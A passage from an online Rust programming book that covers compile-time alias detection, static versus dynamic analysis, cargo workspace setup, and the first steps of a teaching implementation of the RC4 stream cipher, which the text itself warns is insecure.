<pre><pre class="playground"><code class="language-rust">fn incr(a: &amp;mut isize, b: &amp;isize) {
    *a += *b;
}

fn main() {
    // Integers
    let mut val = 40;
    let step = 2;

    // References to integers
    let a = &amp;mut val;
    let b = &amp;step;

    println!("Before incr: a == {}, b == {}", a, b);
    incr(a, b);
    println!("After incr: a == {}, b == {}", a, b);
}</code></pre></pre>
<p>Recall the first pair of diagrams from the last section, where we didn't have aliasing or invalid pointers.
This program will print:</p>
<pre><code class="language-ignore">Before incr: a == 40, b == 2
After incr: a == 42, b == 2
</code></pre>
<p>After the call, we've arrived at that second "good" diagram:</p>
</br>
<p align="center">
  <figure>
  <img width="100%" src="chp2/incr_ptrs_ok_after.svg">
  <figcaption><center>*a points to 42 (incremented), *b points to 2</center></figcaption><br>
  </figure>
</p>
<p>The function works as expected.
Notice how the format specifier, <code>{}</code>, performs a dereference for us to print the integers themselves.</p>
<p>There's no way to generate an invalid pointer with Rust's references.
So that's not something we can even try.
But what happens if we attempt to alias our references, to produce the problematic aliasing diagram from the last section?</p>
<pre><code class="language-rust ignore">fn incr(a: &amp;mut isize, b: &amp;isize) {
    *a += *b;
}

fn main() {
     // Integers
    let mut val = 40;
    let step = 2;

    // Aliasing references to integer `val`
    let a = &amp;mut val;
    let b = a;

    println!("Before incr: a == {}, b == {}", a, b);
    incr(a, b);
    println!("After incr: a == {}, b == {}", a, b);
}</code></pre>
<p>The program never runs. Instead, we get a compile-time error:</p>
<pre><code class="language-ignore">error[E0382]: borrow of moved value: `a`
  --&gt; src/main.rs:16:10
   |
11 |     let a = &amp;mut val;
   |         - move occurs because `a` has type `&amp;mut isize`, which does not implement the `Copy` trait
12 |     let b = a;
   |             - value moved here
...
16 |     incr(a, b);
   |          ^ value borrowed here after move

For more information about this error, try `rustc --explain E0382
</code></pre>
<p>This error is likely confusing.
The compiler is pointing out that we can't duplicate a unique, mutable reference.
That'd be a potentially dangerous alias, especially in a concurrent program.
This error will make more sense after we cover "ownership" and "traits" in Chapter 3.</p>
<h2 id="isnt-that-too-good-to-be-true"><a class="header" href="#isnt-that-too-good-to-be-true">Isn't that too good to be true?</a></h2>
<p>We just saw Rust's compiler detect mutable aliasing, quickly and effectively.
If Rust grants C-like control over memory, shouldn't the compiler's internal analyses hit the same fundamental roadblocks as the points-to analysis we discussed?</p>
<p>Perhaps surprisingly, no.
Three related factors are at play:</p>
<ul>
<li>
<p><strong>Type-system Support:</strong> Rust's internal analyzers build upon a bedrock of direct integration with the language itself, in its type system. This type system implements a flavor of "affine types"<sup class="footnote-reference" id="fr-AffineTypes-1"><a href="#footnote-AffineTypes">7</a></sup> and doesn't permit arbitrary type casting.</p>
<ul>
<li>Performing static analysis on a weakly-typed language (like C) doesn't have comparable co-design advantages. The Rust compiler can prove properties no C-family compiler or analysis tool can prove, by design.</li>
</ul>
</li>
<li>
<p><strong>Runtime Support:</strong> Not all of Rust's memory safety guarantees are enforced at compile time. Some checks need to happen at runtime, so the Rust compiler inserts additional code for this purpose. Rust programs can terminate if those checks fail.</p>
<ul>
<li>While graceful termination is preferable to the violent death of a program whose memory has been trashed or exploited, it's not ideal. We'll cover robustness testing for runtime "panics" in the latter half of this book.</li>
</ul>
</li>
<li>
<p><strong>Hard Constraints:</strong> Safe Rust programs have to obey a set of special rules. The <code>mut</code> keyword has stipulations. These constraints, which are a feature of the type system, make some algorithms difficult to express in Rust - at least without reframing.</p>
<ul>
<li>The most infamous of these constraints is that a reference can be <em>shared</em> (<code>&amp;T</code>) or <em>mutable</em> (<code>&amp;mut T</code>), but not both. This is a roadblock for certain kinds of data structures. We'll explore solutions in the first half of this book.</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>What's a type system, anyway?</strong></p>
<p>Type systems are a prevalent form of static analysis that can eliminate certain kinds of runtime errors.
For a brief aside on the topic, see the <a href="chp2/../chp16_appendix/types.html"><em>Fundamentals: Type Systems</em></a> section of the Appendix.</p>
</blockquote>
<h2 id="takeaway-1"><a class="header" href="#takeaway-1">Takeaway</a></h2>
<p>Rust's compiler provides first-party static analyses to verify memory safety properties.
That's free, immediate, and substantial assurance value-add every time you build a Rust program.</p>
<p>We don't have to rely on expensive products (e.g. complex code analysis tools) or hard-to-scale expert processes (e.g. best-effort code review by skilled security engineers).
It [mostly] "just works".
Assurance becomes a <em>repeatable default</em>.</p>
<p>These guarantees are largely a product of Rust's type system, which introduces the novel concept of "ownership".
Its mechanics overcome memory model and aliasing complications, allowing us to prove certain notions of correctness.
We'll dig into how ownership works in Chapter 3.</p>
<p>Let's move on to dynamic analysis, and start writing our first Rust program.</p>
<blockquote>
<p><strong>Foundations for Formal Verification</strong></p>
<p>Rust's type system has significant implications for formal verification research.
Specifically, lack of shared, mutable state makes the language amenable to verification techniques that use <em>first-order logic</em><sup class="footnote-reference" id="fr-RustHorn-1"><a href="#footnote-RustHorn">8</a></sup>.</p>
<p>First-order logic is taught in undergraduate discrete math classes.
Which are common in Computer Science curriculums.
This could mean that a practicing engineer doesn't have to learn <em>separation logic</em> (a more recent and advanced topic) to use Rust deductive verification tools.</p>
<p>We'll try out early prototypes for deductive verification in Chapter 11.
Rust verification is an area of active academic research.</p>
</blockquote>
<hr>
<ol class="footnote-definition"><li id="footnote-CorecurPodcast">
<p><a href="https://corecursive.com/042-zach-tellman-software-in-context/"><em>Software in Context, With Zach Tellman</em></a>. Zach Tellman, Adam Gordon Bell (2019). <a href="#fr-CorecurPodcast-1">↩</a></p>
</li>
<li id="footnote-MMIO">
<p>Memory Mapped Input/Output (MMIO) is a context in which you need to spray some distant, seemingly random region of memory with a bunch of magic bytes. Perhaps surprisingly, that's one major way to control hardware peripherals. The "data sheet" (an official hardware manual written by the manufacturer) tells you which specific memory address to write what magic bytes to. It's the sort of thing where you just need raw pointers, danger be damned! <sup class="footnote-reference" id="fr-SafeMMIO-1"><a href="#footnote-SafeMMIO">9</a></sup>. <a href="#fr-MMIO-1">↩</a></p>
</li>
<li id="footnote-JungThesis">
<p><a href="https://www.ralfj.de/research/phd/thesis-screen.pdf"><em>Understanding and Evolving the Rust Programming Language (PhD Thesis)</em></a>. Ralf Jung (2020). <a href="#fr-JungThesis-1">↩</a></p>
</li>
<li id="footnote-UnsafeAbstraction">
<p><a href="https://jam1.re/blog/why-rusts-unsafe-works"><em>Why Rust's Unsafe Works</em></a>. jam1garner (2020). <a href="#fr-UnsafeAbstraction-1">↩</a></p>
</li>
<li id="footnote-TypeProof">
<p><a href="https://www.eurekalert.org/news-releases/610682"><em>Computer Scientist proves safety claims of the programming language Rust</em></a>. Saarland University (2021). Note that formal verification of Rust is a research problem with both current successes and ongoing work. <a href="#fr-TypeProof-1">↩</a></p>
</li>
<li id="footnote-TotSafeTrans">
<p><a href="https://blog.yossarian.net/2021/03/16/totally_safe_transmute-line-by-line"><code>totally_safe_transmute</code>, line-by-line</a>. William Woodruff (2021). This blog post breaks down an unorthodox trick for <em>transmutation</em> (re-interpreting the bits of one type as another type). The trick involves the program using OS facilities to modify its own code at runtime in a way the Rust compiler does not and cannot possibly expect. Hence it's "safe" to the compiler but <em>extremely unsafe</em> in reality. This doesn't mean Rust's safety guarantees are broken, just that type systems can't model every possible aspect of a program's execution environment. Nor should they, most real-world programs don't patch their own in-memory representations at runtime. <a href="#fr-TotSafeTrans-1">↩</a></p>
</li>
<li id="footnote-AffineTypes">
<p><a href="https://en.wikipedia.org/wiki/Substructural_type_system#Affine_type_systems"><em>Affine type systems</em></a>. Wikipedia (Accessed 2022). <a href="#fr-AffineTypes-1">↩</a></p>
</li>
<li id="footnote-RustHorn">
<p><a href="https://arxiv.org/pdf/2002.09002.pdf"><em>RustHorn: CHC-based Verification for Rust Programs</em></a>. Yusuke Matsushita, Takeshi Tsukada, Naoki Kobayashi (2020). <a href="#fr-RustHorn-1">↩</a></p>
</li>
<li id="footnote-SafeMMIO">
<p><a href="https://crates.io/crates/tock-registers"><em>tock-registers</em></a>. Tock Project Developers (2021). This project provides safe MMIO abstractions in the form of customizable types. An alternative to raw pointers worth checking out. <a href="#fr-SafeMMIO-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="dynamic-assurance-1-of-3"><a class="header" href="#dynamic-assurance-1-of-3">Dynamic Assurance (1 of 3)</a></h1>
<p>Static analysis can be a tough topic to tackle, it's the tip of the iceberg for a world of theory and proofs that may seem divorced from the realities of day-to-day development.
But, as users of compilers, we benefit from type systems without having to grok all the implementation details.</p>
<p>By comparison, dynamic analysis is the fun and relatable counterpart.
Few developers implement their own static analyses.
Most professional developers write unit tests - little dynamic analyses that exercise a subset of the program in meaningful ways.</p>
<p>Dynamic analysis is conceptually easy to understand: learn about a program by executing it with concrete inputs and observing what happens.</p>
<ul>
<li>
<p><strong>Pro:</strong> We can trust the results of each execution because it's a real-world run of the actual program. There are no false positives<sup class="footnote-reference" id="fr-FalsePos-1"><a href="#footnote-FalsePos">1</a></sup>.</p>
</li>
<li>
<p><strong>Con:</strong> Because we can only observe a single execution at a time, we're building confidence by repeatedly sampling from a pool of data points. But the complete pool is often massive and our sample is a miniscule one. So we can't draw general conclusions.</p>
<ul>
<li>Dynamic analysis can prove the <em>presence</em> of one or more bugs. But it <em>cannot</em> prove the <em>absence</em> of any bug type.</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>What happens when we execute a program?</strong></p>
<p>An orchestra of hardware and software components perform tasks and interact in complex ways.
The 10,000 foot view is something like this:</p>
<p>A <em>loader</em> copies an instance of the program into memory and sets up an isolated environment for it, "spawning a process".
When the process is running and wants to write to disk or read network data, it elicits the cooperation of the <em>Operation System (OS).</em>
That OS manages access to <em>hardware</em>, like the physical disk drive or network interface card.
A relatively tiny state machine, the <em>Central Processing Unit (CPU)</em>, drives the entire sequence of events by rapidly switching between executing your program, hundreds of other programs, and the OS itself.</p>
<p>Dynamic analyses are small programs that piggyback onto the <em>Program Under Test (PUT)</em>.
They "hook into" the PUT as it runs, or perhaps before and after it runs, to record "live events".
For example, a debugger can read the current values of variables at specific points in execution.
A unit test can check return values of a specific function run with specific parameters.</p>
</blockquote>
<h2 id="lets-roll-some-cryptography-in-rust"><a class="header" href="#lets-roll-some-cryptography-in-rust">Let's Roll Some Cryptography in Rust!</a></h2>
<p>Realistically, some non-trivial percentage of readers may never make it past this 2nd chapter.
Real-life priorities shift, learning a new language and a new skill set is a tough task to follow through on.</p>
<p>That's why you're going to write an interesting Rust program right away.
Let's build something real, something you can run.
Both as an end-user of a command line tool and as a tester validating a security-sensitive library.</p>
<p>We're going to write a tiny yet modular program.
It'll have two parts:</p>
<ol>
<li>
<p><strong>Single-cipher cryptographic library:</strong> A from-scratch, embedded-friendly implementation of RC4 - a famous but outdated stream cipher. Consider it a standalone crash course in writing tricky Rust code.</p>
</li>
<li>
<p><strong>A command-line interface:</strong> A way to use your crypto lib to encrypt and decrypt files on your computer. Being able to perform argument parsing and file I/O opens the door to practical projects, in any new language.</p>
</li>
</ol>
<p>Now cryptography is notoriously hard to get right.
And the Rust compiler, powerful as it is, can't statically reason about the correctness of a specific algorithm's implementation - stream cipher or otherwise.
This is where dynamic analysis comes in:</p>
<ul>
<li>
<p>We'll write a unit test showing input-output equivalence to a known-good RC4 implementation.</p>
</li>
<li>
<p>To understand where dynamic analysis fails, we'll insert a naive backdoor into our library.</p>
</li>
</ul>
<blockquote>
<p><strong>What's a stream cipher?</strong></p>
<p>If this term is new to you or you'd just like a quick refresher, please read the <a href="chp2/../chp16_appendix/crypto.html"><em>Fundamentals: Stream Ciphers</em></a> section of the Appendix before proceeding.
It briefly covers the background necessary to understand the cryptographic code in the next section.</p>
</blockquote>
<h2 id="setting-up-our-modular-project"><a class="header" href="#setting-up-our-modular-project">Setting Up Our Modular Project</a></h2>
<p>You'll want to log into the development environment you set up at the end of chapter 1, and follow along from this point on.
Don't just skim the below, learn by doing!</p>
<p>Let's start by checking that the Rust toolchain is correctly installed.
What happens if you run the below command?</p>
<pre><code class="language-ignore">rustup doc --std
</code></pre>
<p>You should see documentation for Rust's standard library open in a web browser.
This command is a handy one to remember.
You might need offline-accessible documentation if you've ever coding <del>in an air-gapped secure facility</del> on a plane.</p>
<p>Next we'll use <code>cargo</code>, Rust's package manager, to create a "workspace"<sup class="footnote-reference" id="fr-Workspaces-1"><a href="#footnote-Workspaces">2</a></sup>.
Workspaces are a convenient way to organize programs composed of independent modules (called <em>crates</em> in the Rust parlance):</p>
<ul>
<li>
<p>Each <strong>crate</strong> is its own independent "project" - like that an IDE might create.</p>
</li>
<li>
<p>In a <strong>workspace</strong>, two or more crates can share a single build directory. This saves compilation time for shared dependencies.</p>
</li>
<li>
<p>Crates can call the public APIs of their workspace peers (other crates in the same workspace, but in a different subdirectory).</p>
</li>
</ul>
<p>Our code in this chapter will be pretty short (less than 200 lines).
But for larger projects, workspaces aid modularity.
Modular code organization keeps complexity in check (more on this in Chapter 3).</p>
<p>First, we'll create a top-level directory to house both our crypto library and its command line interface.
Let's call it <code>crypto_tool</code>:</p>
<pre><code class="language-ignore">mkdir crypto_tool
</code></pre>
<p>Next, we'll use <code>cargo</code> to generate skeletons for two crates:</p>
<ol>
<li>
<p>A library (shared object) crate named <code>rc4</code>.</p>
</li>
<li>
<p>A binary (executable) crate named <code>rcli</code> (a questionable shortening of "RC4 CLI").</p>
</li>
</ol>
<p>The <code>rcli</code> binary will depend on the <code>rc4</code> library's APIs.
Just like a real-world tool using a separate, pre-existing cryptographic library.</p>
<p>To generate the boilerplate for both crates:</p>
<pre><code class="language-ignore">cargo new crypto_tool/rc4 --lib
cargo new crypto_tool/rcli
</code></pre>
<p>Notice the <code>--lib</code> flag tells <code>cargo</code> to create a library crate specifically.
Executable binaries with a <code>main</code> method are the default, if no flag is provided (but you can also use <code>--bin</code> if you want to be explicit).</p>
<blockquote>
<p><strong>What's the difference between a binary and a library?</strong></p>
<p><em>Binaries</em> are stand-alone programs you can run directly.
The <code>tree</code> command below tells your shell to locate and execute the corresponding binary program.</p>
<p><em>Libraries</em> contain reusable code, typically APIs that can be called by binaries or other libraries.
When <code>tree</code> prints output to your console, it calls <code>printf</code> - an API in C's standard library.</p>
<p>Here's a fun fact: for file formats like Linux's ELF and Window's PE, the difference between a library and a binary is only 1 byte in the file header (metadata the loader understands).
Both are just programs, as far as your CPU is concerned!</p>
</blockquote>
<p>At present, <code>cargo</code> doesn't know that our two crates (<code>rc4</code> and <code>rcli</code>) are related.
Right now they just happen to exist in adjacent directories.
Let's keep <code>cargo</code> in the loop by creating a new <code>Cargo.toml</code> file in the <code>crypto_tool</code> directory:</p>
<pre><code class="language-ignore">touch Cargo.toml
</code></pre>
<p>Open this newly-created file, in your editor of choice, and enter the following to inform <code>cargo</code> that <code>rc4</code> and <code>rcli</code> are part of the same workspace:</p>
<pre><code class="language-ignore">[workspace]
members = [
    "rc4",
    "rcli"
]
</code></pre>
<p>If you run the Linux command <code>tree</code>, you should see the following file and directory layout:</p>
<pre><code class="language-ignore">.
└── crypto_tool
    ├── Cargo.toml
    ├── rc4
    │   ├── Cargo.toml
    │   └── src
    │       └── lib.rs
    └── rcli
        ├── Cargo.toml
        └── src
            └── main.rs

5 directories, 5 files
</code></pre>
<p><code>.rs</code> is the extension for Rust source files.
The two <code>.rs</code> files (<code>main.rs</code> and <code>lib.rs</code>) are where we'll write our code.</p>
<p><code>Cargo.toml</code> files are project manifests<sup class="footnote-reference" id="fr-Manifest-1"><a href="#footnote-Manifest">3</a></sup>, configurations for Rust's build system.
Notice the other two were created automatically when you ran <code>cargo new</code>.
Take a second to review their contents.</p>
<p><code>rcli</code> will depend on the <code>rc4</code> library, so <code>cargo</code> needs a way to locate the library code at compile time.
We'll want to add an entry under the <code>[dependencies]</code> tag of its <code>Cargo.toml</code> file.
Open <code>rcli/Cargo.toml</code> and append the last line as below:</p>
<pre><code class="language-toml ignore">[package]
name = "rcli"
version = "0.1.0"
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
rc4 = { path = "../rc4" }
</code></pre>
<p>To verify that your workspace is ready to roll, run <code>cargo build</code> from the <code>crypto_tool</code> directory.
You should see output similar to the below, showing both <code>rc4</code> and <code>rcli</code> being successfully compiled:</p>
<pre><code class="language-ignore">   Compiling rcli v0.1.0 (/home/tb/proj/high-assurance-rust/code_snippets/chp2/crypto_tool/rcli)
   Compiling rc4 v0.1.0 (/home/tb/proj/high-assurance-rust/code_snippets/chp2/crypto_tool/rc4)
    Finished dev [unoptimized + debuginfo] target(s) in 0.43s
</code></pre>
<p>Now that the boilerplate is out of the way, we're ready to start writing our embedded-friendly RC4 library!</p>
<blockquote>
<p><strong>Do I have to understand all the details in the next section?</strong></p>
<p>Nope.
The next section is going to expose you to both Rust syntax and cryptography concepts.
You don't need to fully understand the minutiae to proceed.</p>
<ul>
<li>
<p>Rust's unfamiliar syntax will sink in as we progress, especially after Chapter 3.</p>
</li>
<li>
<p>Cryptography is not the focus of this book, you only need to grasp the broad strokes as context for the example program we're developing in this chapter.</p>
<ul>
<li>Remember to review <a href="chp2/../chp16_appendix/crypto.html">the corresponding appendix section</a> if needed.</li>
</ul>
</li>
</ul>
</blockquote>
<hr>
<ol class="footnote-definition"><li id="footnote-FalsePos">
<p>Generally speaking, there are no false positives in dynamic analysis. But there exist test-specific exceptions. For example, say you're fuzzing (stress testing) a single function to find crashing inputs. You may find a crash, but in reality the full program may sanitize (normalize or reject) your crashing input before passing it along to the function under test. In this case, the crash may not actually be reproducible in the context of the larger program. <a href="#fr-FalsePos-1">↩</a></p>
</li>
<li id="footnote-Workspaces">
<p><a href="https://doc.rust-lang.org/cargo/reference/workspaces.html"><em>Workspaces</em></a>. The Cargo Book (Accessed 2022). <a href="#fr-Workspaces-1">↩</a></p>
</li>
<li id="footnote-Manifest">
<p><a href="https://doc.rust-lang.org/cargo/reference/manifest.html"><em>The Manifest Format</em></a>. The Cargo Book (Accessed 2022). <a href="#fr-Manifest-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="dynamic-assurance-2-of-3"><a class="header" href="#dynamic-assurance-2-of-3">Dynamic Assurance (2 of 3)</a></h1>
<p>Like any stream cipher, RC4 needs to generate a <em>keystream</em> and bitwise XOR it with <em>plaintext</em> to create <em>ciphertext</em>. That's how encryption works.</p>
<ul>
<li>
<p><em>Keystream</em> - data that is reproducible but indistinguishable from random.</p>
</li>
<li>
<p><em>Plaintext</em> - unencrypted data.</p>
</li>
<li>
<p><em>Ciphertext</em> - encrypted data.</p>
</li>
</ul>
<p>Keystream generation is implemented using a buffer to represent <em>cipher state</em>.
Mechanically, RC4's cipher state is a 256 byte array, named <code>s</code>, and indexed with two variables, <code>i</code> and <code>j</code>.
Our first step is creating a structure to store this ever-changing state and the current values of its indexes.
We'll want to add the following at the top of <code>crypto_tool/rc4/src/lib.rs</code>:</p>
<pre><code class="language-rust ignore">#![cfg_attr(not(test), no_std)]
#![forbid(unsafe_code)]

#[derive(Debug)]
pub struct Rc4 {
    s: [u8; 256],
    i: u8,
    j: u8,
}</code></pre>
<ul>
<li>
<p>The first 2 lines are <em>attributes</em>: they communicate with the compiler to configure our project.</p>
</li>
<li>
<p><code>#![cfg_attr(not(test), no_std)]</code> is a conditional attribute. It applies to the whole crate and informs the compiler that, unless doing a <code>test</code> build, our library makes no assumptions about the system it's going to run on.</p>
<ul>
<li><code>no_std</code> roughly translates to "don't depend on a standard library or runtime support being available". Although this restricts us to a set of core Rust features, it makes our code portable for embedded use cases: firmware, bootloaders, kernels, etc. We'll discuss <code>#![no_std]</code> more thoroughly in Chapter 4.</li>
</ul>
</li>
<li>
<p><code>#![forbid(unsafe_code)]</code> is an unconditional attribute. It again applies to the entire crate, telling the compiler to <em>ensure</em> the library has no <code>unsafe</code> code blocks. This allows our code to maximize Rust's memory safety guarantees, even if we refactor it or add new features later.</p>
<ul>
<li>We'll discuss <code>unsafe</code> throughout the book, but won't use this keyword in our main project.</li>
</ul>
</li>
<li>
<p><code>#[derive(Debug)]</code> is a <em>derive macro</em> for something called a <em>trait</em> (definition of shared behavior, explained in Chapter 3). Macros generate additional code. Writing macros is an advanced topic, but you can leverage existing macros even as a beginner<sup class="footnote-reference" id="fr-BeginMacro-1"><a href="#footnote-BeginMacro">1</a></sup>.</p>
<ul>
<li>Notice how <code>#[derive(Debug)]</code> sits atop the <code>Rc4</code> structure? It only applies to this structure, telling the compiler how to pretty print its contents to a console<sup class="footnote-reference" id="fr-TraitDebug-1"><a href="#footnote-TraitDebug">2</a></sup>. Using this macro makes our stream cipher convenient to visually debug in test builds.</li>
</ul>
</li>
<li>
<p>The <code>Rc4</code> structure is the most important part of the above code. Though not an <em>object</em> in the traditional sense<sup class="footnote-reference" id="fr-Obj-1"><a href="#footnote-Obj">3</a></sup>, our structure encapsulates private data and we're going to define methods that operate on that data next. <code>Rc4</code>'s three fields are:</p>
<ul>
<li>
<p><code>s</code>: cipher state, an array of 256 bytes (unsigned, 8-bit integers - hence <code>u8</code>).</p>
</li>
<li>
<p><code>i</code>: "incrementing" index for key stream generation.</p>
</li>
<li>
<p><code>j</code>: "jumping" index for key stream generation.</p>
</li>
</ul>
</li>
</ul>
<p>We're now ready to implement the two halves of RC4's logic: KSA and PRGA.</p>
<blockquote>
<p><strong>WARNING! RC4 is insecure.</strong></p>
<p>Real-world projects need to select a well-audited implementation of a modern, well-tested cipher.
Remember, we've chosen RC4 for this chapter's example because it's relatively easy to implement.
RC4 isn't suitable for professional projects.</p>
</blockquote>
<h2 id="1-the-key-scheduling-algorithm-ksa"><a class="header" href="#1-the-key-scheduling-algorithm-ksa">1. The Key-Scheduling Algorithm (KSA)</a></h2>
<p>The goal of RC4's KSA step is initializing the cipher state array by computing a <em>permutation</em> influenced by a variable-length (40 to 2,048 bit) secret key.</p>
<p>It's best to put this logic in <code>Rc4</code>'s constructor.
So that a library user doesn't have to remember to call a special initialization function before encrypting data.
The cipher instance returned by the constructor will already be initialized.</p>
<blockquote>
<p><strong>Function-related Terminology</strong></p>
<p>This section will use two technical terms.
The concepts aren't unique to Rust, but the terms have specific meaning in Rust programs:<sup class="footnote-reference" id="fr-AssocMeth-1"><a href="#footnote-AssocMeth">4</a></sup></p>
<ul>
<li>
<p><strong>Associated function:</strong> A function that is defined on a structure, but <em>does not</em> take <code>&amp;self</code> (reference to instance of structure) as its first parameter. It doesn't read or write structure fields.</p>
</li>
<li>
<p><strong>Method:</strong> A function defined on a structure that <em>does</em> take <code>&amp;self</code> or <code>&amp;mut self</code> as the first parameter. It reads and/or writes fields on a specific instance of a structure.</p>
</li>
</ul>
</blockquote>
<p>By convention, Rust constructors are <em>associated functions</em> (no <code>self</code> parameter) named <code>new</code> that return an instance of the structure being constructed.</p>
<p>Let's add one that performs KSA, right below the <code>Rc4</code> structure definition.
Notice we define <code>new</code> inside an <code>impl Rc4</code> block, tying it to the structure of the same name:</p>
<pre><code class="language-rust ignore">impl Rc4 {
    /// Init a new Rc4 stream cipher instance
    pub fn new(key: &amp;[u8]) -&gt; Self {
        // Verify valid key length (40 to 2048 bits)
        assert!(5 &lt;= key.len() &amp;&amp; key.len() &lt;= 256);

        // Zero-init our struct
        let mut rc4 = Rc4 {
            s: [0; 256],
            i: 0,
            j: 0,
        };

        // Cipher state identity permutation
        for (i, b) in rc4.s.iter_mut().enumerate() {
            // s[i] = i
            *b = i as u8;
        }

        // Process for 256 iterations, get starting cipher state permutation
        let mut j: u8 = 0;
        for i in 0..256 {
            // j = (j + s[i] + key[i % key_len]) % 256
            j = j.wrapping_add(rc4.s[i]).wrapping_add(key[i % key.len()]);

            // Swap values of s[i] and s[j]
            rc4.s.swap(i, j as usize);
        }

        // Return our initialized Rc4
        rc4
    }
}</code></pre>
<p>The above code might make you a little uncomfortable.
That's OK.
Learning any new language involves squinting at code you don't fully understand.
And that's usually not a great feeling.</p>
<p>To make matters worse, cryptographic code is just its own weird thing - regardless of the implementation language.
Let's double down and try to make sense of it:</p>
<ul>
<li>
<p><code>new</code> takes a single parameter, <code>key</code>, which is a <em>reference to a slice of bytes</em>. This signature makes passing in key data efficient<sup class="footnote-reference" id="fr-SliceEff-1"><a href="#footnote-SliceEff">5</a></sup> and flexible<sup class="footnote-reference" id="fr-SliceFlex-1"><a href="#footnote-SliceFlex">6</a></sup>. We'll cover slices in Chapter 3.</p>
</li>
<li>
<p>The <code>assert!</code> statement, another macro, ensures the user of our API provides a key of valid length. If not, our program will terminate at this line. That's an aggressive way to handle errors. We'll talk about other options later.</p>
</li>
<li>
<p><code>let mut rc4 = ...</code> creates a <em>mutable</em> instance of our <code>Rc4</code> structure with all fields zero initialized. Variables are immutable by default in Rust. But we'll be setting up cipher state (the <code>s</code> array), we need the <code>mut</code> keyword here.</p>
</li>
<li>
<p>The next bit of code, a <code>for</code> loop identity permutation<sup class="footnote-reference" id="fr-IDPerm-1"><a href="#footnote-IDPerm">7</a></sup>, is just a fancy way to set <code>s[0] = 0, s[1] = 1, s[2] = 2, ..., s[255] = 255</code>. It uses <em>iterators</em>. We'll implement our own iterators in Chapter 10, so let's not dwell on the syntax right now.</p>
</li>
<li>
<p>The subsequent <code>for</code> loop <em>further permutes</em> the cipher state <code>s</code>. Three details worth pointing out:</p>
<ul>
<li>
<p>We have to use the <code>wrapping_add</code> function instead of the addition operator (<code>+</code>) in cryptographic code because we want <em>integer overflow</em> (explanation coming in Chapter 3) to emulate modular arithmetic<sup class="footnote-reference" id="fr-ModArith-1"><a href="#footnote-ModArith">8</a></sup>.</p>
</li>
<li>
<p>Have you ever swapped two variables using a third (probably named <code>temp</code>)? If your answer is "good God, a hundred times" then you'll appreciate how <code>swap</code> is a built-in method for arrays in Rust.</p>
</li>
<li>
<p>Indexes are always register-width unsigned integers in Rust. So, in the call to <code>swap</code>, we promote <code>j</code> (a lowly <code>u8</code>) to a <code>usize</code> with the <code>as</code> keyword. Think of this minor detail as a "safe cast"<sup class="footnote-reference" id="fr-Cast-1"><a href="#footnote-Cast">9</a></sup>.</p>
</li>
</ul>
</li>
<li>
<p>The final line of the <code>new</code> function returns an initialized instance of an <code>Rc4</code> structure. Rust functions don't need the <code>return</code> keyword unless you want to return early (e.g. halfway through the function body) for some reason.</p>
<ul>
<li>The return type of the function (specified right after <code>-&gt;</code>) is <code>Self</code>. Because <code>new</code> is inside an <code>impl Rc4</code> block, this is shorthand for returning an instance of an <code>Rc4</code> structure.</li>
</ul>
</li>
</ul>
<p>Visualizing a round of permutation might make the concept more tangible.
Every loop iteration, <code>i</code> and <code>j</code> change (with <code>j</code> being influenced by the key) and <code>rc4.s.swap(i, j as usize)</code> just switches two values within <code>s</code>:</p>
<br>
<p align="center">
  <img width="100%" src="chp2/rc4_1.svg">
  <figure>
  <br>
  <figcaption><center>Visualization of swapping <i><b>s[i]</i></b> and <i><b>s[j]</i></b></center></figcaption><br>
  </figure>
</p>
<h2 id="2-pseudo-random-generation-algorithm-prga"><a class="header" href="#2-pseudo-random-generation-algorithm-prga">2. Pseudo-Random Generation Algorithm (PRGA)</a></h2>
<p>The <code>new</code> function creates and initializes an instance of the <code>Rc4</code> cipher.
We need another function that uses an <code>Rc4</code> instance to generate a keystream.
Once we have a keystream, we can encrypt data with it.</p>
<p><code>prga_next</code> is our keystream generation function, it outputs a single keystream byte each time it's called.
We'll add it right after the <code>new</code> function, inside the same <code>impl Rc4</code> block.</p>
<p>Unlike the <code>new</code> <em>associated function</em>, <code>prga_next</code> is a <em>method</em>.
Methods always take a reference to <code>self</code>, an instance of the structure they're being called on, as their first parameter.</p>
<pre><code class="language-rust ignore">impl Rc4 {
    // ..new() definition omitted..

    /// Output the next byte of the keystream
    pub fn prga_next(&amp;mut self) -&gt; u8 {
        // i = (i + 1) mod 256
        self.i = self.i.wrapping_add(1);

        // j = (j + s[i]) mod 256
        self.j = self.j.wrapping_add(self.s[self.i as usize]);

        // Swap values of s[i] and s[j]
        self.s.swap(self.i as usize, self.j as usize);

        // k = s[(s[i] + s[j]) mod 256]
        self.s[(self.s[self.i as usize].wrapping_add(self.s[self.j as usize])) as usize]
    }
}</code></pre>
<p>This function performs similar operations to the <code>new</code> function, so we don't need to go over it in detail.
We're concerned with getting a taste of Rust, not with the specific operations RC4's design dictates.
There is, however, one detail worth pointing out:</p>
<ul>
